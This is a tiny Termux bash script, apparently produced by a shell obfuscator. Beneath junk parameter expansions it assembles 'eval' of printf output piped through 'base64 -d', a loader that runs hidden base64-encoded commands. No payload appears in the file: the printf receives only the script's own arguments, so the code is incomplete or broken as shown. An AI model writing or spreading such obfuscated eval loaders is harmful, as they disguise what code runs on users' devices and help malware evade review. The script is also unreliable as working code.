#!/data/data/com.termux/files/usr/bin/bash
 ${*~}   ${*/b\`aT<H.4/_jUH1} ""e'v'${@^^}a"${@%%\(GSu_}"l  "$(    "${@//yUmz^>hN/hBK6Z+2|}" """${@,}"pri"${@%%&2KbKc}"n$'\164'''"f"   ""   ${*~}  $*  | ${@^^} ${@%9<jnMZK=}  ""b$'\141's\e\64 -d  ${@##Xg3;}  )" ${@~~}   ${@#aBtKDS%b} 